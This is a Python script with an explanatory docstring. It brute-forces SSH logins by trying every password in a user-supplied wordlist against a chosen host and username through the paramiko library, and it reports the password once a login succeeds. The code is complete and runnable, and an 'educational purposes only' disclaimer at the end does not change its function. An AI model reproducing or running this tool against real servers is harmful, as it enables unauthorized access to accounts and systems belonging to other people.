#This program will bruteforece the ssh for passwords and then it will try to connect

import paramiko, os, sys, socket, termcolor

#install paramiko and the termcolor it is important

""" code parameter is set to zero is in case if there is nothing in the second parameter then will 
                                         be set as zero"""
def ssh_connect(password , code = 0):
    ssh =  paramiko.SSHClient() #write the proper working of the functions
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port = 22, username = username , password= password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
          code= 2
    ssh.close()
    return code



host = input("[+]Enter the host you want to connect to :")
username = input("[+] SSH username :")
input_file = input("[+] Passwords File : ")

#os will check if the file is there or not

if os.path.exists(input_file) == False:
    print('[!] That file doesnt exist')
    sys.exit(1)
with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip('\n')
        try:
            response = ssh_connect(password) #contains the returned code
            if response == 0:
                print(termcolor.colored(("We have a connection" + password + ',' + " For account" +  username),'green'))
                break
            elif response == 1 :
                print('[+] Incorrect login' + password)
            elif response == 2:
                print('[!] Cant connect')
                sys.exit(1)
        except Exception as e:
            print(e)
            pass

#192.168.43.45
""""
This is a Python program that performs a brute-force attack on an SSH server using a list of passwords from a file. The program uses the Paramiko library, which provides an implementation of the SSHv2 protocol, to attempt to connect to the SSH server with each password until a successful connection is made.

Here is a breakdown of the functions used in the program:

paramiko.SSHClient() creates an SSH client object that can be used to connect to an SSH server.

ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) sets the host key policy for the SSH client to automatically add unknown host keys.

ssh.connect(host, port=22, username=username, password=password) attempts to connect to the SSH server with the specified host, port, username, and password.

paramiko.AuthenticationException is an exception raised when authentication fails, such as when an incorrect password is provided.

socket.error is an exception raised when a socket error occurs, such as when the SSH server is not reachable.

os.path.exists(input_file) checks if the specified input file exists.

file.readlines() reads all the lines in the specified file.

line.strip('\n') removes the newline character from the end of each line in the file.

termcolor.colored() adds color to the output text, making it easier to read.

The program starts by prompting the user for the host, SSH username, and password file. It then checks if the password file exists and opens it for reading. For each password in the file, the program calls the ssh_connect() function with the password as an argument. If the connection is successful, the program prints a message indicating the password and username that were successful and exits. If the connection fails due to incorrect login credentials, the program prints a message indicating the incorrect password. If the connection fails due to a socket error, the program prints a message indicating that it was unable to connect to the server and exits.

Note that this program is for educational purposes only and should not be used to perform unauthorized access to SSH servers.






"""